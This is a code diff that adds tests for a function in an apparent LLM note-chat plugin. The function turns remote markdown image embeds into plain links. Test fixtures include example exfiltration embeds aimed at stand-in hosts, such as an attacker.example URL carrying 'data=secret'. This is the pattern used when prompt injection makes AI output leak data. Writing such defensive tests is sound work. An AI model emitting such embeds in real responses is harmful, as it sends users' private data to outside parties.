@@ -7,7 +7,8 @@ import {
 	setRequestUrlHandler,
 } from "./obsidian-mock";
 
-const { buildSystemPrompt, runPipeline } = await import("../src/chat/pipeline");
+const { buildSystemPrompt, neutralizeRemoteImageMarkdown, runPipeline } =
+	await import("../src/chat/pipeline");
 const { VaultIndex } = await import("../src/index/vault-index");
 const { DEFAULT_SETTINGS } = await import("../src/settings");
 const { NIM_BASE_URL } = await import("../src/providers/openai-compatible");
@@ -39,6 +40,50 @@ describe("buildSystemPrompt", () => {
 	test("says plainly when no notes were found", () => {
 		const prompt = buildSystemPrompt([]);
 		expect(prompt).toContain("No relevant notes were found");
+	});
+});
+
+describe("neutralizeRemoteImageMarkdown", () => {
+	test("turns an https image embed into a plain link", () => {
+		const input = "See ![leak](https://attacker.example/?data=secret) here.";
+		expect(neutralizeRemoteImageMarkdown(input)).toBe(
+			"See [leak](https://attacker.example/?data=secret) here.",
+		);
+	});
+
+	test("turns an http image embed into a plain link", () => {
+		expect(
+			neutralizeRemoteImageMarkdown("![x](http://evil.example/x.png)"),
+		).toBe("[x](http://evil.example/x.png)");
+	});
+
+	test("turns a protocol-relative image embed into a plain link", () => {
+		expect(neutralizeRemoteImageMarkdown("![x](//evil.example/x.png)")).toBe(
+			"[x](//evil.example/x.png)",
+		);
+	});
+
+	test("leaves local/relative image embeds untouched", () => {
+		const input = "![diagram](attachments/diagram.png)";
+		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
+	});
+
+	test("leaves data: image embeds untouched", () => {
+		const input = "![x](data:image/png;base64,AAAA)";
+		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
+	});
+
+	test("leaves plain (non-image) links untouched", () => {
+		const input = "[a link](https://example.com)";
+		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
+	});
+
+	test("handles multiple remote embeds in the same string", () => {
+		const input =
+			"![a](https://x.example/a.png) text ![b](https://x.example/b.png)";
+		expect(neutralizeRemoteImageMarkdown(input)).toBe(
+			"[a](https://x.example/a.png) text [b](https://x.example/b.png)",
+		);
 	});
 });
 
